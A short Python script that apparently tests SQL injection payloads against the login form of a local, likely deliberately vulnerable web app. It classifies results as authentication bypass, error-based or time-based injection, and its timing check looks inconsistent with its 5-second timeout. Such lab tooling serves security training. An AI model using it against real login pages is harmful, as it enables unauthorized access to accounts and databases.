import requests
import time

def test_payload(payload, start_time):
    url = "http://localhost:8080/index.php?page=login.php"
    session = requests.Session()

    data = {
        "username": payload,
        "password": "password",
        "login-php-submit-button": "Login"
    }

    try:
        response = session.post(url, data=data, timeout=5, allow_redirects=False)
        location = response.headers.get("Location", "")
        elapsed_time = time.time() - start_time

        # Check for successful login bypass.
        if "popUpNotificationCode=AU1" in location:
            return "Success(S): Payload bypassed login authentication."
        
        # Check for error-based SQL injection.
        elif any(keyword.lower() in response.text.lower () for keyword in [
            "sql syntax", "mysql_fetch", "mysql_", "uncaught exception", "error in your SQL syntax", "syntax error", "database error", "invalid query", "no such table", "no such column", "unknown column", "unknown table",
            "warning: mysql", "warning: mysqli", "warning: pgsql", "warning: pdo", "warning: sqlite", "error: mysql", "error: mysqli", "error: pgsql", "error: pdo", "error: sqlite"
        ]):
            return "Success(S): Payload successfully showed Error-based SQL injection."
        
        
        elif elapsed_time > 8:
            return "Success(S): Payload successfully showed Time-based SQL injection with delay of {:.2f} seconds.".format(elapsed_time)
        else:
            return "Failure(F): Payload did not bypass login authentication."
    except requests.RequestException as e:
        return f"Error: {str(e)}"